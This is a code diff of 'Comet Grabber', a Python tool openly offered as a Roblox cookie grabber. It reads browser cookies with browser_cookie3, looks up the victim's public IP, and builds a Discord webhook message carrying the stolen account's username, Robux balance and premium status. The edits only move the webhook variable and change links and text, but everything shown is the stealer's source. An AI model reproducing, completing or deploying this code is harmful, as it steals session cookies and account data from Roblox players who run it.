@@ -1,11 +1,12 @@
 # Comet Grabber - A free non-dualhooked Roblox Tool made by Bank
 
+webhook = "" # Put webhook here
+
 import robloxpy
 import requests
 import browser_cookie3
 
 ip = requests.get("https://api.ipify.org/").text
-webhook = "" # Put webhook here
 
 def cookiecheckerandsend(cookie, platform):
 
@@ -30,10 +31,10 @@ def cookiecheckerandsend(cookie, platform):
                 "image": {
                     "url": "https://media.discordapp.net/attachments/1110979917178490973/1110984988977025055/cometbanner.gif?width=1440&height=83"
                 },
-                "description" : f"[Github](https://web.roblox.com) | [Rolimons](https://www.rolimons.com/player/{rid}) | [Profile](https://web.roblox.com/users/{rid}/profile) | [Premium](https://web.roblox.com)",
+                "description" : f"[Github](https://github.com/3banked/CometGrabber) | [Rolimons](https://www.rolimons.com/player/{rid}) | [Profile](https://web.roblox.com/users/{rid}/profile)",
                 "color" : 0xfa0000,
                 "fields": [
-                    {"name": "Buy Premium", "value": "Click above to buy Premium!", "inline": False},
+                    {"name": "Buy Premium", "value": "Click above to buy Premium! (Coming soon)", "inline": False},
                     {"name": "Username", "value": f"```fix\n{username}```", "inline": True},
                     {"name": "Robux", "value": f"```fix\n{robux}```", "inline": True},
                     {"name": "Premium", "value": f"```fix\n{premium}```","inline": True},
